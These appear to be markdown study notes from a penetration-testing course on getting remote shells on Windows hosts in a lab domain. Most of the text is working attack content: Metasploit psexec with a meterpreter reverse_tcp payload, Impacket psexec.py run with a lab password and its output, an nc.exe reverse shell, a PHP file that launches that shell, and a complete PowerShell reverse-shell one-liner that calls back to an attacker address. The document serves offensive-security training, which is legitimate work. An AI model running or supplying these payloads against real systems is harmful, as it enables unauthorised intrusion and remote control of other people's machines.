# Shell Access

Payloads Deliver us Shells

Within the IT industry as a whole, Payload can be defined in a few different ways:

- Networking: The encapsulated data portion of a packet traversing modern computer networks.
- Basic Computing: A payload is the portion of an instruction set that defines the action to be taken. Headers and protocol information removed.
- Programming: The data portion referenced or carried by the programming language instruction.
- Exploitation & Security: A payload is code crafted with the intent to exploit a vulnerability on a computer system. The term payload can describe various types of malware, including but not limited to ransomware.

In this module, we will be working with many different types of payloads and delivery methods within the context of granting ourselves access to a host and establishing remote shell sessions with vulnerable systems.

## Shell validation

- `ps`
- `env`

## SMB - PSExec

### With Metasploit

```msfconsole```
- we can seach psexec or type:
```use exploit/windows/smb/psexec```
```show options```
- We need to set rhosts, lhost, smbdomain, smbpass and smbuser
- We also need to set the payload depending on our target for instance `windows/x64/meterpreter/reverse_tcp`
- We should get a shell

```bash
[*] Started reverse TCP handler on 10.0.2.8:4444 
[*] 10.0.2.4:445 - Connecting to the server...
[*] 10.0.2.4:445 - Authenticating to 10.0.2.4:445|marvel.local as user 'fcastle'...
[*] 10.0.2.4:445 - Selecting PowerShell target
[*] 10.0.2.4:445 - Executing the payload...
[+] 10.0.2.4:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (200262 bytes) to 10.0.2.4
[*] Meterpreter session 1 opened (10.0.2.8:4444 -> 10.0.2.4:51468 ) at 2022-02-04 10:28:51 -0500

meterpreter > 
```

### With Impacket - psexec.py

Can be useful if meterprer is picked up by AV.

```bash
┌──(kali㉿kali)-[~]
└─$ psexec.py marvel.local/fcastle:Password1@10.0.2.4                                                                                                                                                                                    1 ⨯
Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation

[*] Requesting shares on 10.0.2.4.....
[*] Found writable share ADMIN$
[*] Uploading file OKJXcwkr.exe
[*] Opening SVCManager on 10.0.2.4.....
[*] Creating service tDbW on 10.0.2.4.....
[*] Starting service tDbW.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.19044.1288]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

- We can also try with: wmbexec.py or wmiexec.py (same command except for name of the script of course)

### Get a shell with nc.exe

- If we have access to a win and need to get a reverse shell for some reason (like privesc or else) we can use nc.exe
- You can get it here if you are on kali `/usr/share/windows-resources/binaries/nc.exe`
- Once on the target you can launch it with `nc.exe -e cmd.exe IP-KALI PORT`
- You could even put this line in a php file if say you had access to an ftp or smb that are used to transfer files to serve 

```php
<?php
system('nc.exe -e cmd.exe IP-KALI PORT')
?>
```

## Powershell

- Connect to our attack machine from a powershell prompt
  - We set a listener `rlwrap nc -lvp 443`
  - `powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.4',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`